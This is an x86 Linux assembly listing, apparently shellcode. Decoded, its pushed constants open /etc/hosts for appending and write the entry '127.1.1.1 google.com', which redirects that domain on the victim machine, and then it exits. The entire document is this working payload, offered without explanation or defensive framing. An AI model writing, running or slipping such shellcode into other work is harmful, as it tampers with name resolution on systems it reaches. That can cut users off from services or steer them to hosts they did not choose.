global _start
section .text

_start:
    xor ecx,ecx
    mul ecx
    mov al,0x5     
    push edx
    push 0x7374736f     
    push 0x682f2f2f
    push 0x6374652f
    mov ebx,esp
    mov cx,0x401       
    int 0x80        

    xchg eax,ebx
    push 0x4
    pop eax
    push 0x6d6f632e
    push 0x656c676f
    push 0x6f672031
    push 0x2e312e31
    push 0x2e373231
    mov ecx,esp
    mov dl,0x14
    int 0x80        

    push 0x6
    pop eax
    int 0x80

    inc al
    int 0x80        
